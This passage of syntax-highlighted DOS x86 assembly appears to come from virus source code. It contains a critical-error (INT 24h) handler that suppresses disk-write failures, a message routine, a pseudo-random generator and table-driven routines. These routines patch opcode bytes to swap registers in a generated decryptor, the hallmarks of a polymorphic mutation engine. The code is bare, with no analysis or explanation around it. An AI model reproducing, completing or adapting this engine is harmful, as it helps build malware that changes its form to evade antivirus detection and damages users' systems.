</span><span class="sc5">Set_0</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">Jnz</span><span class="sc0">     </span><span class="sc5">Set_1</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">03d</span><span class="sc0">  
    </span><span class="sc6">Jmp</span><span class="sc0">     </span><span class="sc5">vit</span><span class="sc0">
</span><span class="sc5">Set_1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">],</span><span class="sc2">02h</span><span class="sc0">
    </span><span class="sc6">Jnz</span><span class="sc0">     </span><span class="sc5">Set_2</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">06d</span><span class="sc0">  
    </span><span class="sc6">Jmp</span><span class="sc0">     </span><span class="sc5">vit</span><span class="sc0">
</span><span class="sc5">Set_2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">],</span><span class="sc2">03h</span><span class="sc0">
    </span><span class="sc6">Jnz</span><span class="sc0">     </span><span class="sc5">Set_3</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">09d</span><span class="sc0">  
    </span><span class="sc6">Jmp</span><span class="sc0">     </span><span class="sc5">vit</span><span class="sc0">
</span><span class="sc5">Set_3</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">],</span><span class="sc2">04h</span><span class="sc0">
    </span><span class="sc6">Jnz</span><span class="sc0">     </span><span class="sc5">Set_4</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">12d</span><span class="sc0">  
    </span><span class="sc6">Jmp</span><span class="sc0">     </span><span class="sc5">vit</span><span class="sc0">
</span><span class="sc5">Set_4</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">],</span><span class="sc2">05h</span><span class="sc0">
    </span><span class="sc6">Jnz</span><span class="sc0">     </span><span class="sc5">Set_5</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">15h</span><span class="sc0">  
    </span><span class="sc6">Jmp</span><span class="sc0">     </span><span class="sc5">vit</span><span class="sc0">
</span><span class="sc5">Set_5</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">],</span><span class="sc2">06h</span><span class="sc0">
    </span><span class="sc6">Jnz</span><span class="sc0">     </span><span class="sc5">Set_6</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">18d</span><span class="sc0">  
    </span><span class="sc6">Jmp</span><span class="sc0">     </span><span class="sc5">vit</span><span class="sc0">
</span><span class="sc5">Set_6</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">],</span><span class="sc2">07h</span><span class="sc0">
    </span><span class="sc6">Jnz</span><span class="sc0">     </span><span class="sc5">Set_7</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">21d</span><span class="sc0">  
    </span><span class="sc6">Jmp</span><span class="sc0">     </span><span class="sc5">vit</span><span class="sc0">
</span><span class="sc5">Set_7</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">],</span><span class="sc2">08h</span><span class="sc0">
    </span><span class="sc6">Jnz</span><span class="sc0">     </span><span class="sc5">Set_8</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">21d</span><span class="sc0">  
    </span><span class="sc6">Jmp</span><span class="sc0">     </span><span class="sc5">vit</span><span class="sc0">
</span><span class="sc5">Set_8</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">],</span><span class="sc2">09h</span><span class="sc0">
    </span><span class="sc6">Jnz</span><span class="sc0">     </span><span class="sc5">Set_9</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">18d</span><span class="sc0">  
    </span><span class="sc6">Jmp</span><span class="sc0">     </span><span class="sc5">vit</span><span class="sc0">
</span><span class="sc5">Set_9</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">],</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc6">Jnz</span><span class="sc0">     </span><span class="sc5">Set_a</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">15d</span><span class="sc0">  
    </span><span class="sc6">Jmp</span><span class="sc0">     </span><span class="sc5">vit</span><span class="sc0">
</span><span class="sc5">Set_a</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">],</span><span class="sc2">0bh</span><span class="sc0">
    </span><span class="sc6">Jnz</span><span class="sc0">     </span><span class="sc5">Set_b</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">12d</span><span class="sc0">  
    </span><span class="sc6">Jmp</span><span class="sc0">     </span><span class="sc5">vit</span><span class="sc0">
</span><span class="sc5">Set_b</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">],</span><span class="sc2">0ch</span><span class="sc0">
    </span><span class="sc6">Jnz</span><span class="sc0">     </span><span class="sc5">Set_c</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">09d</span><span class="sc0">  
    </span><span class="sc6">Jmp</span><span class="sc0">     </span><span class="sc5">vit</span><span class="sc0">
</span><span class="sc5">Set_c</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">],</span><span class="sc2">0dh</span><span class="sc0">
    </span><span class="sc6">Jnz</span><span class="sc0">     </span><span class="sc5">Set_d</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">06d</span><span class="sc0">  
    </span><span class="sc6">Jmp</span><span class="sc0">     </span><span class="sc5">vit</span><span class="sc0">
</span><span class="sc5">Set_d</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">],</span><span class="sc2">0eh</span><span class="sc0">
    </span><span class="sc6">Jnz</span><span class="sc0">     </span><span class="sc5">Set_e</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">03d</span><span class="sc0">  
    </span><span class="sc6">Jmp</span><span class="sc0">     </span><span class="sc5">vit</span><span class="sc0">
</span><span class="sc5">Set_e</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">],</span><span class="sc2">0fh</span><span class="sc0">
    </span><span class="sc6">Jnz</span><span class="sc0">     </span><span class="sc5">Set_f</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">vit</span><span class="sc0">
</span><span class="sc5">Set_f</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">rt</span><span class="sc0">

</span><span class="sc5">set</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Rol</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Cl</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc8">Ah</span><span class="sc0">
    </span><span class="sc6">Div</span><span class="sc0"> </span><span class="sc8">Ch</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]+[</span><span class="sc8">Bx</span><span class="sc4">],</span><span class="sc8">Al</span><span class="sc0">
    </span><span class="sc6">Inc</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Ret</span><span class="sc0">
</span><span class="sc5">Mes</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Dx</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc5">Cop</span><span class="sc4">+[</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc0">
    </span><span class="sc6">Ret</span><span class="sc0">

</span><span class="sc5">ort</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Movsb</span><span class="sc0">
    </span><span class="sc6">Movsw</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">res</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">
    </span><span class="sc6">Jnz</span><span class="sc0"> </span><span class="sc5">d1</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc0">
    </span><span class="sc6">Ret</span><span class="sc0">
</span><span class="sc5">d1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc0">
    </span><span class="sc6">Jnz</span><span class="sc0"> </span><span class="sc5">d2</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">
    </span><span class="sc6">Ret</span><span class="sc0">
</span><span class="sc5">d2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">
    </span><span class="sc6">Jnz</span><span class="sc0"> </span><span class="sc5">d3</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">15h</span><span class="sc0">
    </span><span class="sc6">Ret</span><span class="sc0">
</span><span class="sc5">d3</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">15h</span><span class="sc0">
    </span><span class="sc6">Jnz</span><span class="sc0"> </span><span class="sc5">d4</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">
</span><span class="sc5">d4</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Ret</span><span class="sc0">

</span><span class="sc5">rand</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0">     </span><span class="sc8">Cl</span><span class="sc4">,</span><span class="sc8">Cl</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">set</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Cl</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">set</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Cl</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">set</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Cl</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">set</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Ret</span><span class="sc0">

</span><span class="sc5">R_Vec24</span><span class="sc0">        </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">Vec24</span><span class="sc4">+[</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">Vec24</span><span class="sc4">+[</span><span class="sc8">Bp</span><span class="sc4">]+</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">Ret</span><span class="sc0">
</span><span class="sc5">R_Vec24</span><span class="sc0">        </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc5">Set_Int_24</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Ds</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Bx</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Dx</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">3524h</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">Vec24</span><span class="sc4">+[</span><span class="sc8">Bp</span><span class="sc4">]+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc8">Bx</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">Vec24</span><span class="sc4">+[</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc8">Es</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Cs</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">
        </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc5">intr24</span><span class="sc4">+[</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc0">
        </span><span class="sc6">Ret</span><span class="sc0">

</span><span class="sc1">;Intr21        PROC</span><span class="sc0">
</span><span class="sc1">;   db  09ah</span><span class="sc0">
</span><span class="sc1">;   vector  dd  ?</span><span class="sc0">
</span><span class="sc1">;       ret</span><span class="sc0">
</span><span class="sc1">;Intr21        ENDP</span><span class="sc0">

</span><span class="sc5">Intr24</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">3h</span><span class="sc0">
    </span><span class="sc6">Iret</span><span class="sc0">

</span><span class="sc5">vit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Di</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc5">tabl</span><span class="sc4">+[</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Add</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Add</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">ort</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">res</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Di</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc5">tabl</span><span class="sc4">+[</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Add</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc2">600h</span><span class="sc0"> </span><span class="sc1">;-------------------------??????????</span><span class="sc0">
    </span><span class="sc6">Add</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc8">Dx</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">ort</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc6">Ret</span><span class="sc0">
</span><span class="sc5">mreg</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">Jnz</span><span class="sc0"> </span><span class="sc5">q1</span><span class="sc0">
    </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">Bx_r</span><span class="sc0">
</span><span class="sc5">q1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
    </span><span class="sc6">Jnz</span><span class="sc0"> </span><span class="sc5">Si_r</span><span class="sc0">
</span><span class="sc5">Di_r</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]+</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">15h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]+</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">35h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]+</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]+</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]+</span><span class="sc2">10h</span><span class="sc4">,</span><span class="sc2">1dh</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]+</span><span class="sc2">13h</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]+</span><span class="sc2">16h</span><span class="sc4">,</span><span class="sc2">2dh</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]+</span><span class="sc2">18h</span><span class="sc4">,</span><span class="sc2">0bfh</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]+</span><span class="sc2">1bh</span><span class="sc4">,</span><span class="sc2">47h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]+</span><span class="sc2">1dh</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
    </span><span class="sc6">Ret</span><span class="sc0">
</span><span class="sc5">Si_r</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]+</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">14h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]+</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">34h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]+</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]+</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]+</span><span class="sc2">10h</span><span class="sc4">,</span><span class="sc2">1ch</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]+</span><span class="sc2">13h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]+</span><span class="sc2">16h</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]+</span><span class="sc2">18h</span><span class="sc4">,</span><span class="sc2">0beh</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]+</span><span class="sc2">1bh</span><span class="sc4">,</span><span class="sc2">46h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]+</span><span class="sc2">1dh</span><span class="sc4">,</span><span class="sc2">0feh</span><span class="sc0">
    </span><span class="sc6">Ret</span><span class="sc0">
